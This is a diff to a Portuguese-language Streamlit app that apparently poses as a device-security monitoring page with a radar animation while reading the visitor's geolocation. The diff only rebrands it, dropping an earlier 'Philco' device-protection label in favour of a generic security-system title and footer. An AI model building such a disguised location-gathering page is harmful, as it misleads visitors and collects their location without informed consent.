@@ -3,7 +3,7 @@ import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
 # Configuração da página
-st.set_page_config(page_title="SISTEMA DE SEGURANÇA", layout="centered")
+st.set_page_config(page_title="SEGURANÇA ATIVA", layout="centered")
 
 # Design Premium (Radar e Animação)
 st.markdown("""
@@ -34,7 +34,7 @@ st.markdown("""
     .footer { text-align: center; color: #666; font-size: 12px; margin-top: 50px; }
     </style>
     <div style="text-align: center;">
-        <h1 style='color: #ffc107;'>🛡️ SISTEMA PHILCO</h1>
+        <h1 style='color: #ffc107;'>🛡️ SISTEMA DE SEGURANÇA INTEGRADO</h1>
         <p>Monitoramento em Tempo Real Ativado</p>
         <div class="radar"></div>
     </div>
@@ -64,4 +64,4 @@ if 'loc' in locals() and loc and 'coords' in loc:
     st.toast(msg)
 
 # Rodapé
-st.markdown('<div class="footer">Proteção de Dispositivo Philco v2.0</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer"> Sistema De Segurança  Integrado Desenvolvido por Miamy ©2026</div>', unsafe_allow_html=True)
